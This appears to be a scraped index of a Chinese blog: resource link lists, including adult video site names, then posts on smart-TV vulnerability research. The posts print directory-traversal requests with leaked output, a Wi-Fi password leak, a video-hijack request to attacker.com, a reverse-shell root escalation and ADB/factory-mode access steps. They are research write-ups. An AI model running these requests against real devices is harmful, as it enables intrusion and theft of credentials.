","date":"2021-11-22","objectID":"/zh-cn/ybc/:10:0","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#教程 npx (opens new window)教你怎么合理的使用 npx hacksplaining (opens new window)网络安全学习网站 mobile-web-best-practice (opens new window)移动 web 最佳实践 ","date":"2021-11-22","objectID":"/zh-cn/ybc/:11:0","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#产品 产品大牛 (opens new window)什么有很多完整的产品原型可以借鉴 磨刀 (opens new window)快速出 ui 原型 ","date":"2021-11-22","objectID":"/zh-cn/ybc/:12:0","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#实用 typeform (opens new window)一个国外的在线调查问卷网站 VideoFk (opens new window)VideoFk 视频在线解析下载 全历史 (opens new window)历史内容聚合网站 UzerMe (opens new window)云端办公工具 SoBooks (opens new window)强大的电子书资源网站 稿定设计 (opens new window)键式设计工具+智能抠图 大力盘 (opens new window)百度网盘搜索 ENFI 下载器 (opens new window)不限速下载器 来画视频 (opens new window)像做 PPT 一样做短视频 Arkie 海报制作工具(opens new window) 优品 PPT(opens new window) 比格 PPT(opens new window) 高清免费图片(opens new window) 高清免费图片 2(opens new window) ","date":"2021-11-22","objectID":"/zh-cn/ybc/:13:0","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#Talk peerigon-talks (opens new window)收集了不少有意思的 talks ","date":"2021-11-22","objectID":"/zh-cn/ybc/:14:0","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"#算法 leetcode (opens new window)用 js 刷 leetcode 学习每天在数据科学方面变得更好 ide codesandbox ","date":"2021-11-22","objectID":"/zh-cn/ybc/:15:0","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":[],"content":"一些网址 18+｜网址 麻豆传媒 麻豆TV 2048 18av javpart javopen mov18plug guru javsky javuf javplay pigav (有中文字幕) javmost javcl javhub (無碼) javhiv av01 (Jav) javjack 18av (海量影片) 7mm (全中文介面) javdoe buzzav youav hpjav (有中字) jav777 (有中字) avgle (更新密) javhihi (無碼) movie-rush 141jav 5278 say-move 每日福利 集芳阁 成人影片數據庫 ","date":"2021-11-22","objectID":"/zh-cn/ybc/:15:1","tags":[],"title":"自用资源","uri":"/zh-cn/ybc/"},{"categories":["智能","电视","漏洞汇总"],"content":"此文为加密收费内容添加我微信支付后可看: 智能电视漏洞汇总 最近在测试某大厂的智能电视中遇到了不瓶颈，毕竟是第一次专注的研究智能电视，对电视的了解还不够深。挖不动烦躁的时候，就回头想想曾经看过的智能电视的漏洞，记忆都很零散，今天把智能电视曾曝出的漏洞做个汇总，看看大佬们都有哪些奇妙的思路。 ","date":"2021-11-21","objectID":"/zh-cn/21-4/:0:0","tags":["智能","电视","漏洞汇总"],"title":"智能电视漏洞汇总","uri":"/zh-cn/21-4/"},{"categories":["智能","电视","漏洞汇总"],"content":"命令注入漏洞 某电视名称命令注入 某电视名称重命名使用反引号可注入任意命令。文章中并没有没有说细节吗，猜测是前台设置的电视名称，后端应该是使用系统命令将电视名称设置成 hostname ，由于没有过滤从而造成了任意命令执行。 乐视电视利用 UPnP 安装应用 18年 GeekPwn 上的乐视电视任意应用安装也比较有意思。利用 UPnP 提供的下载服务下载并安装应用，之前并没有想到还有这种操作。现在电视使用的大多使用第三方的投屏服务，这种骚操作的机会少了。 发现 UPnP 协议中通过 XML 文件声明告知手机控制端自身提供原用于遥控器应用更新下载服务可被滥用，通过控制端连接电视后即可发送 XML Message 的方式请求 DownLoadFile 的服务，电视内部收到服务请求未进行有效过滤即进行下载 APK 动作。下载 APK 应用后，发送消息请求电视 DLNA 服务向电视 EUI 系统发送特定内容广播。利用电视广播服务，调用系统内部静默安装服务，并对 Activity 进行调用。 ","date":"2021-11-21","objectID":"/zh-cn/21-4/:0:1","tags":["智能","电视","漏洞汇总"],"title":"智能电视漏洞汇总","uri":"/zh-cn/21-4/"},{"categories":["智能","电视","漏洞汇总"],"content":"目录遍历漏洞 TCL 目录遍历(CVE-2020-27403) TCL 电视 7989 开放了 web 服务，未授权用户能够访问电视中的文件。 Sony Smart TV 目录遍历（CVE-2019-10886） 索尼智能电视 “图片共享” 应用没有限制目录，从而可以读取任意文件。 root@kali:~# curl -v http://192.168.1.102:10000/contentshare/image/default.prop Trying 192.168.1.102... TCP_NODELAY set Connected to 192.168.1.102 (192.168.1.102) port 10000 (#0) \u003e GET /contentshare/image/default.prop HTTP/1.1 \u003e Host: 192.168.1.102:10000 \u003e User-Agent: curl/7.58.0 \u003e Accept: / \u003e \u003c HTTP/1.1 200 OK \u003c Connection: close \u003c Content-Length: 591 \u003c Content-Type: application/octet-stream \u003c # # ADDITIONAL_DEFAULT_PROPERTIES # ro.secure=1 security.perf_harden=1 ro.allow.mock.location=0 ro.debuggable=0 ro.zygote=zygote32 dalvik.vm.image-dex2oat-Xms=64m dalvik.vm.image-dex2oat-Xmx=64m dalvik.vm.dex2oat-Xms=64m dalvik.vm.dex2oat-Xmx=512m ro.dalvik.vm.native.bridge=0 debug.atrace.tags.enableflags=0 # # BOOTIMAGE_BUILD_PROPERTIES # ro.bootimage.build.date=2016? 11? 14? ??? 15:34:56 JST ro.bootimage.build.date.utc=1479105296 ro.bootimage.build.fingerprint=Sony/BRAVIA_ATV2_PA/BRAVIA_ATV2:6.0.1/MMB29V.S50/1.6.0.06.14.0.00:user/release-keys persist.sys.usb.config=none Closing connection 0 Appear TV 目录遍历（CVE-2018-7539） Appear TV XC5000 、XC5100 电视的 “Maintenance Center” 服务对外开放了WEB服务，监听在 8088 端口。 GET /../../../../../../../../../../../../etc/passwd Host: x.x.x.x:8088 User-Agent: curl/7.56.1 Accept: */* HTTP/1.1 200 OK Content-Length: 1110 Content-Type: text/plain; charset=utf-8 Cache-Control: max-age=3600 Server: fuzzd/0.1.1 root❌0:0:root:/root:/bin/ash bin❌1:1:bin:/bin:/sbin/nologin daemon❌2:2:daemon:/sbin:/sbin/nologin adm❌3:4:adm:/var/adm:/sbin/nologin ","date":"2021-11-21","objectID":"/zh-cn/21-4/:0:2","tags":["智能","电视","漏洞汇总"],"title":"智能电视漏洞汇总","uri":"/zh-cn/21-4/"},{"categories":["智能","电视","漏洞汇总"],"content":"权限提升 LG webOS OS 任意文件覆盖提权 任意文件覆盖：luna-send-pub 命令调用 downloadmanager 服务可以下载文件到本地的任意位置，且文件属主为 root 。 系统中的 /etc/luna-services2/ls-hubd.conf 配置文件中定义了可执行脚本，脚本在点数开机的之后会被 Root 调用指令。 [Dynamic Services] ExecPrefix=/usr/sbin/setcpushares-ls2 LaunchTimeout=300000 于是，可以通过覆盖 ls-hubd.conf 配置文件，将 ExecPrefix 的值设定为自定义脚本所在的路径。当电视重启之后，就能够提升到 Root 权限了。 在本地创建 ls-hubd.conf 文件； 在电视中编写反弹 shell 脚本； 使用 luna-send-pub 下载 ls-hubd.conf 覆盖原有文件； 本地监听，然后重启服务之后就拿到了具备 Root 权限了 Shell 了。 ","date":"2021-11-21","objectID":"/zh-cn/21-4/:0:3","tags":["智能","电视","漏洞汇总"],"title":"智能电视漏洞汇总","uri":"/zh-cn/21-4/"},{"categories":["智能","电视","漏洞汇总"],"content":"拒绝服务漏洞 Sony BRAVIA 电视 TCP 泛洪攻击（CVE-2019-11890） Sony 电视泛洪攻击电视会重启。原来电视也怕 TCP 泛洪攻击，还以为只有像工控的这种低性能设备重启的概率会高一些。 此外，还有不少其他形式的 DOS，如缓冲器溢出等，由于没有公布细节，这里就不讲了。 ","date":"2021-11-21","objectID":"/zh-cn/21-4/:0:4","tags":["智能","电视","漏洞汇总"],"title":"智能电视漏洞汇总","uri":"/zh-cn/21-4/"},{"categories":["智能","电视","漏洞汇总"],"content":"其他漏洞 ADB CVE-2019-6005：KDDI Smart TV Box 默认在 5555 端口开放了 ADB。 CVE-2019-9871：Jector Smart TV FM-K75 默认在 5555 端口开放了 ADB，且权限为 root。 SUPRA智能云电视视频劫持漏洞（CVE-2019-12477） SUPRA 电视开放了 80 端口，提供的功能包含自定义的投屏服务，但没有验证用户和资源的合法性，于是未授权用户就可以播放任意内容。 向电视设备插入任意视频播放的构造请求如下。 GET /remote/media_control?action=setUri\u0026uri=http://attacker.com/fake_broadcast_message.m3u8 HTTP/1.1 Host: 192.168.1.155 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 现在，电视开放的端口还挺多的。尤其是现在有的家电厂商希望把智能电视打造为智能家居的中枢，肩负的任务也越来越多，但不少的服务没有基本的授权验证。 Sony Smart TV 信息泄露 Sony Smart TV 在 10000 端口开放了 WEB 服务，未授权用户访问 /contentshare 页面，可以获取无线网络的明文密码。 root@kali:~# wget -qO- --post-data='{\"id\":80,\"method\":\"getContentShareServerInfo\",\"params\":[],\"version\":\"1.0\"}' http://[ip_tv]:10000/contentshare/ {\"result\":[{\"ssid\":\"DIRECT-GD-BRAVIA\",\"keyType\":\"\",\"key\":\"8362tbwX\",\"deviceName\":\"\",\"url\":\"http:\\/\\/192.168.49.1\",\"touchPadRemote\":\"notSupported\"}],\"id\":80} ","date":"2021-11-21","objectID":"/zh-cn/21-4/:0:5","tags":["智能","电视","漏洞汇总"],"title":"智能电视漏洞汇总","uri":"/zh-cn/21-4/"},{"categories":["智能","电视","漏洞汇总"],"content":"总结 智能电视形似一台有着巨大屏幕的手机，与手机不同的是智能电视作为服务端提供各类服务。由于电视厂家有各自生态的考量，应用五花八门，分析纰漏出来的漏洞，不少是权限问题，各种服务的认证问题还是重中之重。从CVE 、CNVD 中的数据来看，拒绝服务最多，然后是目录遍历、命令执行，最后是信息泄露、提权等。 首发于：火线Zone ","date":"2021-11-21","objectID":"/zh-cn/21-4/:0:6","tags":["智能","电视","漏洞汇总"],"title":"智能电视漏洞汇总","uri":"/zh-cn/21-4/"},{"categories":["智能","电视","漏洞挖掘","Getshell"],"content":"此文为加密收费内容添加我微信支付后可看: ","date":"2021-11-21","objectID":"/zh-cn/21-3/:0:0","tags":["智能","电视","漏洞挖掘","Getshell"],"title":"智能电视漏洞挖掘初探之 Getshell","uri":"/zh-cn/21-3/"},{"categories":["智能","电视","漏洞挖掘","Getshell"],"content":"智能电视漏洞挖掘初探之 Getshell 上周发了一篇智能电视历史漏洞的文章，这周来分享一下智能电视的攻击点以及怎么上手。智能电视不仅仅是用来看电视的，也可以是智能家居的枢纽。电视不是单独的存在，还能与手机、智能家居进行互动。正是由于应用场景的不断拓展，安全问题也逐渐显露。想象一下“ 你在看电视，电视却在看你 ”的诡异画面。曾有新闻报道，自己家电视的播放不受控制，莫名其妙的播放了一些奇奇怪怪的东西。这是怎么一回事儿呢，我们首先来了解一下电视。 一般人很少全面的了解智能电视，一般就用刷刷剧，其中有不少人甚至不会用 DLNA 投屏服务。下面来看看，在挖掘智能电视漏洞之前需要了解的基础信息。 很多人天天使用电视，却不知道电视使用什么系统。知道采用什么系统，心里就有最基本的方向了。智能电视使用的操作系统有 Android、WebOS、Tizen、TV OS(IOS)等。 Android：国内主流使用的电视操作系统，应用生态丰富，各大电视厂家进行了深度定制。 WebOS: LG 电视使用 WebOS 操作系统，WebOS 以 Linux 内核为主体并加上专有转件的操作系统，几经转手现在归 LG 旗下。 Tizen: 三星电视使用 Tizen 操作系统，同样基于Linux。Tizen 系统是英特尔 MeeGo 系统与三星 LiMo 系统整合而来的。 TV OS(IOS): APPLE TV 使用的操作系统，由 IOS 分化而来，国内极少见。 话说，还有华为鸿蒙，暂时还没有碰过，这里就不讨论了，哪位大大，能赞助一台华为智慧屏，咱们就来仔细聊聊。于国内而言，几乎一色的深度定制 Android 系统。下面我们就来看看采用 Android 系统的电视的漏洞挖掘。 ","date":"2021-11-21","objectID":"/zh-cn/21-3/:1:0","tags":["智能","电视","漏洞挖掘","Getshell"],"title":"智能电视漏洞挖掘初探之 Getshell","uri":"/zh-cn/21-3/"},{"categories":["智能","电视","漏洞挖掘","Getshell"],"content":"信息收集 漏洞挖掘的第一步都是信息收集，需要对设备进行摸底，收集各类信息，设备架构、操作系统、外设、各类服务、供应链等。其中有不少的重要消息可以从互联网上找到。 同一家的智能电视往往有很多共通之处，互联网上可以找到很多东西，如 “如何安装第三方应用”、“工程模式”、“怎么开启 ADB调试”、“如何进入Recovery模式” 等。 第三方应用安装：电视内置的应用商店提供的应用都不太多，如果有个性化的需求，需要安装第三方的应用。怎么安装第三方应用呢。当下你肯定不是第一个有需求的人，上网搜一搜，很多电视的第三方应用安装方法就出来了。其中欢视网就提供了主流品牌电视的第三方应用安装方法，新兴的小众品牌可以到论坛去找。 当贝市场 也提供第三方应用安装方法。 沙发管家 也提供第三方应用安装方法。 通用的方法是，将第三方应用下载到 U 盘，插入到电视上进行安装。直接安装可能无法安装，有的需要开启文件管理器 APK 显示，有的要开启允许未知应用安装。 欢视网、当贝市场等只涉及国内，没有国外电视工程模式进入的方法。国外电视可以在 Category:Service Menu - Factory-Reset.com 以及 Hard Master Reset 上查询。上面不但有进入工程模式的方法，还有进入 Recovery 和本地刷机的方法。 工程模式：与 Android 手机一样，电视也是有工程模式的。通过特殊的组合按键可以进去隐藏的工程模式。这里可以查看设备基本信息、设置系统参数等。以下是网络上收集的一些电视工程模式的进入方法。 长虹电视 新款带语音的遥控器：按【菜单键】后，当焦点移至 “情景模式” 下的 “标准模式” 菜单上时，按【上、右、右】组合键，弹出数字软键盘，当输入【0 8 1 6】进入工厂菜单。 带数字按键的遥控：按电视遥控器的【节目源键】，把信号调节到 HDMI，按遥控器 【菜单键】 然后左侧出来菜单栏后，依次按数字键【 0 8 1 6】，然后，就进入工厂模式 了。 TCL电视：将【音量】减到0，调出“主菜单”, 光标移至”对比度”并点击【确定键】；在 2 秒内迅速按数字键【9 7 3 5】可进入工厂模式。 小米电视：在系统菜单中进入“设置”-\u003e “关于” -\u003e “联系客服”；在 “联系客服” 界面继续按住遥控器的 【下方向键】，即可看到 工厂模式 的入口。 海信电视：按下遥控器的【菜单键】，在菜单键中选择“声音设置”，再之后选择平衡选项，输入0532，完成之后，即可进入到海信电视的工程模式。 创维酷开电视：打开系统设置页面，进入到本机“详细信息”；遥控器依次按下【上上下下左右左右】方向键，就可以进入工程模式了。 索尼电视：开机播放有线电视节目，按遥控器上【电源/待机键】，进入待机，然后依此按下 遥控器上的【屏显】、【5】、【音量+】、【电源/待机】，后进入工程模式。 乐视电视：首先“开机” -\u003e “主页” -\u003e 按遥控器上数字键 【2580】，即可进入工程模式。 三星电视：将电视进入待机状态，依次按下遥控器上的【显示键】、【项目键】、【静音键】、【电源键】，即进入工程模式，关闭电源就可以退出工程模式。 康佳电视：按一下菜单按钮，画面弹出普通功能设置菜单。这时连续点按5次“回看”按钮，即可打开康佳电视工厂模式菜单。 ADB : 一般在 “工程模式” 或 “开发者模式” 中开启 ADB 调试功能，甚至有点的智能电视直接默认开启了 ADB。 Recovery 模式：Android 电视也有 Recovery 刷机模式，下面是一些电视的 Recovery 模式的进入方法。 创维：断电再重新通电的同时连续点按遥控的上键（I71和I71C、A818/A818C是点按遥控的左键），即可进入Recovery模式。 华为盒子: 先将盒子关机，然后开机，在开机时开始一直按遥控器的【菜单键】和【音量-】（不停点按两个键，不是长按），就会进入Recovery 模式。 小米：开机中，同时按住遥控器上的【主页键】和【菜单键】，机器进入Recovery 模式。 其他：有的还有像手机一样，开机按【电源键】和【音量-】进入 Recovery 模式，另外值得注意的是有些电视可以在 “工程模式” 中选择进入Recovery 模式。 其他信息：如固件包等。 ","date":"2021-11-21","objectID":"/zh-cn/21-3/:1:1","tags":["智能","电视","漏洞挖掘","Getshell"],"title":"智能电视漏洞挖掘初探之 Getshell","uri":"/zh-cn/21-3/"},{"categories":["智能","电视","漏洞挖掘","Getshell"],"content":"拆箱 收到电视，当然是最爱的拆箱环节，自己动手组装电视。组装之前，最好看一遍 “用户手册” ，看一看电视有哪些接口，遥控器的使用说明以及其他信息。 接口，电视上一般有音频输入输出接口、网口、HDMI、USB、天线等。当然也可以直接看电视上的接口。 遥控器，一个遥控器有什么好看的，谁还不会用啊？现在电商厂商玩的越来越花了，遥控器上除了红外，有的还有蓝牙和 NFC。看一下用户手册，了解是否有什么不常见的新功能以及如何使用。 ","date":"2021-11-21","objectID":"/zh-cn/21-3/:1:2","tags":["智能","电视","漏洞挖掘","Getshell"],"title":"智能电视漏洞挖掘初探之 Getshell","uri":"/zh-cn/21-3/"},{"categories":["智能","电视","漏洞挖掘","Getshell"],"content":"建立热点 开机之后先不要忙着连接 Wi-Fi ，建立一个热点，抓取初次连接的数据包。运气好的话，可以抓到明文传输的升级包以及设备激活信息。以下是某电视升级包的下载请求。 ","date":"2021-11-21","objectID":"/zh-cn/21-3/:1:3","tags":["智能","电视","漏洞挖掘","Getshell"],"title":"智能电视漏洞挖掘初探之 Getshell","uri":"/zh-cn/21-3/"},{"categories":["智能","电视","漏洞挖掘","Getshell"],"content":"了解业务 查看系统中有哪些内置应用，重点关注电视厂商自己的应用。如系统设置、投屏服务、智能家居联动服务等。 ","date":"2021-11-21","objectID":"/zh-cn/21-3/:1:4","tags":["智能","电视","漏洞挖掘","Getshell"],"title":"智能电视漏洞挖掘初探之 Getshell","uri":"/zh-cn/21-3/"},{"categories":["智能","电视","漏洞挖掘","Getshell"],"content":"威胁建模 对智能电视有整体的了解后，就到了威胁建模的阶段。 硬件安全 拆机调试接口（串口）是否封闭，是否存在授权等。 Flash 是否容被提权。 ADB 调试 电视都有 ADB 调试，如何开启 ADB。 通信安全 重要数据是否明文传输。特别是OTA，能否从 OTA 获取升级包地址，升级包能够被替换。此外有的遥控器也是有OTA的，这是容易被忽略的。 蓝牙可能存在 nday。 电视与其他终端的交互安全 电视与手机、IOT等设备之间的交互，这一类一般采用私有协议。其中存在隐私泄露、拒绝服务、服务被滥用等威胁。 系统以应用安全 越权、命令执行、缓冲区溢出、敏感信息泄露等。 ","date":"2021-11-21","objectID":"/zh-cn/21-3/:1:5","tags":["智能","电视","漏洞挖掘","Getshell"],"title":"智能电视漏洞挖掘初探之 Getshell","uri":"/zh-cn/21-3/"},{"categories":["智能","电视","漏洞挖掘","Getshell"],"content":"从端口扫描到提权 利用端口扫描发现对外开放的服务，并利用之前收集的信息获取 ADB 权限，开始智能电视漏洞挖掘之旅。 分析对外开放的服务 智能电视是一个大屏手机，与手机不同的，电视会开放一些端口用于和其他设备交互，手机默认是不会开放端口的。通过端口扫描查看电视对外开放的端口，分析电视对外开放的开放服务。 比如 TCL 某型号电视就默认就开启了 ADB。adb connect ip:5555 就能拿到交互式 shell，这对后续的分析很有帮助。 此外，还有 7983 端口，直接访问这不明显是目录遍历么。 调试入口 对外开放的端口看完了，此时可能已经发现了一些问题，目录遍历、ADB等。但有些端口，直接是看不出来用途的，这时候需要进入系统去看端口对应的服务。 如果运气好的话，开放了 ADB 可以直接连。如果没有就可以尝试上面提到的进入工程模式的方法，去找 ADB 开启选项是否在里面。 例如，创维的某款电视，在设置进入本机信息后，在此界面按 上上下下左右左右进入工程模式。在进入工程模式之后，选择通用设置，进入后可以打开 ADB 调试。 提权 有了 ADB 之后，去看监听端口的服务时，发现程序名为 -。其实这是权限的问题，普通用户查看，此时我们需要提权。 Android 提权，分析系统中的应用，利用应用缺陷来提权。这一步至关重要，要 hook 应用等都需要 Root 权限。提权还是很费时间的，但是有的电视自带提权应用。TCL 就是其一，使用 tclsu就能从 shell 用户切换到 root 用户。 另外，如果 Android 版本比较低的话可以用 Root 工具提权。 到这里，就拿到了系统的 Root 权限，随后就可以深入的挖掘电视的漏洞了。 没有ADB但可以安装任意应用 一切不可能这么顺利，有的电视 ADB 调试开关藏得就是很深，就是找不到，但是可以安装任意 APK 。这种情况下，可以安装神器 Termux，这不就有了一个 shell。后续可以把 /system 目录下的文件拖下来分析嘛。 既没有ADB也不能安装任意应用 不少也是预留有电视串口的，只是有的默认开启，有的需要在工程模式中打开。 串口进入一般是没有认证。 再者，这些都不行。那就要一步一步的突破，想办法开启 ADB 调试或安装第三方应用，针对实际情况采取不同手段了。 ","date":"2021-11-21","objectID":"/zh-cn/21-3/:1:6","tags":["智能","电视","漏洞挖掘","Getshell"],"title":"智能电视漏洞挖掘初探之 Getshell","uri":"/zh-cn/21-3/"},{"categories":["智能","电视","漏洞挖掘","Getshell"],"content":"总结 本文是智能电视漏挖掘的入门文章，从信息收集到 Getshell，但这只是漏洞挖掘的起点，更多的需要对APK、Native程序、乃至对 Android 系统底层的深入研究。 后面有机会的话和大家分享漏洞挖掘的一些细节，敬请关注。点赞超过 20 ，更新”下一集”。 ","date":"2021-11-21","objectID":"/zh-cn/21-3/:1:7","tags":["智能","电视","漏洞挖掘","Getshell"],"title":"智能电视漏洞挖掘初探之 Getshell","uri":"/zh-cn/21-3/"},{"categories":["智能","电视","漏洞挖掘","Getshell"],"content":"参考 欢视助手 安装教程 常见电视或盒子进入Recovery模式的方法汇总 ","date":"2021-11-21","objectID":"/zh-cn/21-3/:1:8","tags":["智能","电视","漏洞挖掘","Getshell"],"title":"智能电视漏洞挖掘初探之 Getshell","uri":"/zh-cn/21-3/"},{"categories":["智能","电视","漏洞挖掘","分析","提权"],"content":"此文为加密收费内容添加我微信支付后可看: ","date":"2021-11-21","objectID":"/zh-cn/21-2/:0:0","tags":["智能","电视","漏洞挖掘","分析","提权"],"title":"智能电视漏洞挖掘初探之从文件系统分析到提权","uri":"/zh-cn/21-2/"},{"categories":["智能","电视","漏洞挖掘","分析","提权"],"content":"智能电视漏洞挖掘初探之从文件系统分析到提权 上一篇文章讲到，通过工程模式等方法获取到了 Android ADB 的 shell，现在就来讲讲后续。 研究智能电视和分析其他 IOT 设备相似，ADB 进来之后，首先看运行的程序、 开放的端口信息。当输入命令 netstat -antp 我都愣住了，长期使用 root 权限的我，从来没见过这阵仗，PID/Program Name 中全是 -，这就很尴尬了。不知道是什么程序启用的端口。 使用浏览器访问其中的一个 WEB 端口，尝试了好些路径都是 404 Not Found。 按传统的 Web 套路，那得 Fuzz 路径。但电视上 Web 服务路径的基本都不是常规路径，那只得分析占用这个端口的应用。netstat 又看不到进程，系统中的文件又是何其的多。单个端口从海量的应用中去分析调用者，费时费力。分析查看不到的原因是，由于 adb 的权限为 shell 权限低，看不到端口对应的进程信息。电视开放了多个端口，一劳永逸的方法仍旧只有提权一条路。 遵循 Linux “一切皆文件” 的思想本质，归根到底还是要回到文件。分析文件之前需要对文件系统有个整体的把握。之前零散的玩过几个 Android 电视，发现文件系统与 Android 的大体相似，但也存在着一些差异。这些电视的文件系统有些共性的东西，正好乘着这次机会把文件系统结构梳理一下。 ","date":"2021-11-21","objectID":"/zh-cn/21-2/:1:0","tags":["智能","电视","漏洞挖掘","分析","提权"],"title":"智能电视漏洞挖掘初探之从文件系统分析到提权","uri":"/zh-cn/21-2/"},{"categories":["智能","电视","漏洞挖掘","分析","提权"],"content":"文件系统结构 Android 智能电视的文件系统结构和 Android 高度相似，但也有些特有的结构。 Customer -\u003e /tvcustomer/Customer：电视厂商自定义文件，有的电视把开机动画放在这里 Database -\u003e /tvdatabase/Database: 数据库目录 DatabaseBackup -\u003e /tvdatabase/DatabaseBackup: bin : 少量可执行文件，目录下的文件大多来自 /system/bin/ cache : 缓存临时文件夹，访问需要 root 权限 charger -\u003e /sbin/charger : 指向 /sbin/charger config : 配置文件 data : 用户软件和各种数据。 local/tmp 临时目录，无权限要求，在这里可以给上传的的文件 chmod 加上执行权限 app 普通程序安装目录 data \u003cpackage_name\u003e files 应用安装目录 default.prop -\u003e system/etc/prop.default : 默认系统属性配置文件 dev : 存放设备节点文件，如串口等。 etc -\u003e /system/etc : /etc 指向 /system/etc 配置文件目录 init : 系统启动的第一个用户程序 init.usb.rc : 初始化配置文件，厂商自定义功能和名称，一般有多个，这个是针对 USB 的 lib -\u003e /mnt/vendor/tvservice/glibc :指向 glibc lost+found : 回收站 mnt : 外部存储设备挂载路径，如 U 盘，手机中文件管理器的读取的就在这个路径下 /mnt/sdcard odm : odm 的文件，目录下的文件链接自 /vendor/odm/ oem : oem 的文件，目录下的文件链接自 /vendor/oem/ proc : 运行时文件，全局系统信息 product -\u003e /system/product : 指向 /system/product sbin : 其中有少量可执行程序 sdcard -\u003e /storage/self/primary : SD卡中的 FAT32 文件系统挂载的目录 storage : 内部存储目录 sys : 内核对象 system 系统中 最要用 的一个目录，大部分内容在这个目录。 app: 应用目录 etc: 配置文件 lib: 库文件 product: 一些工厂应用 bin: 可执行文件 fake-libs: ART虚拟机库文件 libart.so lib64: 库文件 recovery-from-boot.p: 系统刷写使用 build.prop: 系统配置文件 fonts: 字体库 media: 媒体文件 usr: 用户文件夹 compatibility_matrix.xml: framework : 框架文件 jar 包 priv-app : 特权应用，不能使用 kill 命令关闭 vendor -\u003e /vendor: 指向 /vendor tmp -\u003e /var/tmp : 临时文件，指向 /var/tmp var : 储存各种变化的文件 vendor 供应商的程序目录 bin: 可执行程序 config -\u003e /vendor/tvconfig/config: 电视的配置文件，多与硬件相关 default.prop: 默认系统属性配置文件 etc: 配置文件 firmware: 存放Wi-Fi 等模块的固件目录 lib: 库文件 lib64: 库文件 lost+found: 回收站 manifest.xml: 供应商接口文件 tvcertificate: 电视证书目录 tvconfig: 电视配置文件 **Tips：**系统中最重要的目录是 /system/ 和 /vendor/，普通权限也能获取其中大部分的文件。直接 adb pull 有些文件拉不下来，可以先 tar 打包到 /mnt/sdcard 然后在用 adb 下载到本地。 tar czvf /mnt/sdcard/filesystem.tar.gz /vendor/ /system/ adb pull /mnt/sdcard/filesystem.tar.gz . ","date":"2021-11-21","objectID":"/zh-cn/21-2/:1:1","tags":["智能","电视","漏洞挖掘","分析","提权"],"title":"智能电视漏洞挖掘初探之从文件系统分析到提权","uri":"/zh-cn/21-2/"},{"categories":["智能","电视","漏洞挖掘","分析","提权"],"content":"特有结构 智能电视的根文件系统中有一些特有的文件目录，如 odm、oem、tvconfig、tvservice、tvcustomer、tvdatabase等。 电视也是供应链的产品，也有贴牌的产品。首先把 OEM、ODM、OBM 的定义搞清楚，这几个词。 OEM（Original Equipment Manufacturer）即原始设备制造商，A方看中B方的生产能力，让B方生产A方设计的产品，用A方商标。对B方来说，这叫OEM。 ODM（Original Design Manufacturer）即原始设计制造商，A方的技术和设计，被B方看中，B方引进生产，贴上B方标签，对A方来说，这叫ODM； OBM（Original Brand Manufacturer），即原始品牌制造商，A自行创立A品牌，B生产、销售拥有A品牌的产品。对A来说，称为OBM。 分析了多个品牌的电视固件后发现，处理器多采用 MTK 平台。电视使用的处理器是 MTK 旗下的 Mstar(晨星)半导体的。刚开始比较纳闷，这俩什么关系，也就刚写东西去查了才知道，2012年 MTK 收购了 Mstar。Mstar 提供智能电视的解决方案，属于 ODM，所以在 /odm 和 /vendor 目录下可以看到他们的文件。 /odm : 芯片解决方案提供的基础代码，/odm 目录下的文件会链接 /vendor 目录下的同名文件。 /oem: 多数情况下为空 /vendor/tvconfig：电视启动阶段的配置文件，多与硬件设备有关。有的电视不使用 /tvdatabase、/tvcustomer,而将这些文件放在这个目录下。 /vendor/tvservice: 一些电视服务相关的可执行文件和库文件。 /tvcustomer: 电视厂商自定义文件夹，有的厂商使用存在开机需要的文件，如开机视频等。 /tvdatabase: 数据库目录,如电视的RGB值、HDMI、音频等。 ","date":"2021-11-21","objectID":"/zh-cn/21-2/:1:2","tags":["智能","电视","漏洞挖掘","分析","提权"],"title":"智能电视漏洞挖掘初探之从文件系统分析到提权","uri":"/zh-cn/21-2/"},{"categories":["智能","电视","漏洞挖掘","分析","提权"],"content":"文件系统分析到提权 理清整个文件系统的结构之后，就开始分析系统中文件了。首先看的是系统的初始化脚本，其中定义很多服务，还有很多初始化命令。去寻找有没有什么可以利用的。运气还不错，看到了一个后门服务。 在初始化脚本发现后门 init.rc 是用户空间执行的第一个程序 init 的配置文件。除了 init.rc，还有形如 init.[名称].rc。这些文件在 Android (MIUI) 普通用户是不可读的，在智能电视中往往是可读的。 init.rc 首先会使用 import 把其他的 rc 文件导入进来，拓展当前的配置。import 属于类型声明中的 Command（命令），另外三个分别是 Actions（行为）、Services（服务）和Options（选项）。下面举几个例子，熟悉一下 init.rc 的语法。 Service Service 的语法格式： service \u003cname\u003e \u003cpathname\u003e [ \u003cargument\u003e ]* \u003coption\u003e \u003coption\u003e ... 示例： service console /system/bin/sh class core console disabled user shell group shell log readproc seclabel u:r:shell:s0 setenv HOSTNAME console 示例解析： 第一行：这里声明了一个名为 console 的服务，console 服务调用 /system/bin/sh 创建一个子进程。 第二行：指定服务类为 core。 第三行：disable 表示默认不启动。 第四行：指定程序运行的用户权限，这里为 shell。 第五行：指定程序的所属组，赋予所属组的权限。这里有shell、log以及eadproc。 第六行：安全标签，在执行服务之前改变安全级别。u:r:shell:s0 是 SELinux 的安全上下文。 第七行：设置系统环境变量 HOSTNAME 为 console。 Action Action 的语法格式： on \u003ctrigger\u003e \u003ccommand\u003e \u003ccommand\u003e \u003ccommand\u003e 示例： on property:ro.debuggable=1 # Give writes to anyone for the trace folder on debug builds. # The folder is used to store method traces. chmod 0773 /data/misc/trace # Give reads to anyone for the window trace folder on debug builds. chmod 0775 /data/misc/wmtrace start console 示例解析：其中 trigger 是触发条件，当触发条件满足时将依次执行 command。当属性值 ro.debuggable 等于 1 时，启动上述的 console 服务。 后门服务调用分析 在某次漏洞挖局中，在 init.factory.rc(漏洞点已做匿名化处理) 中看到过厂商预留的一个后门服务。 on property:factory.debug=1 start factory.debug start adbd service factory 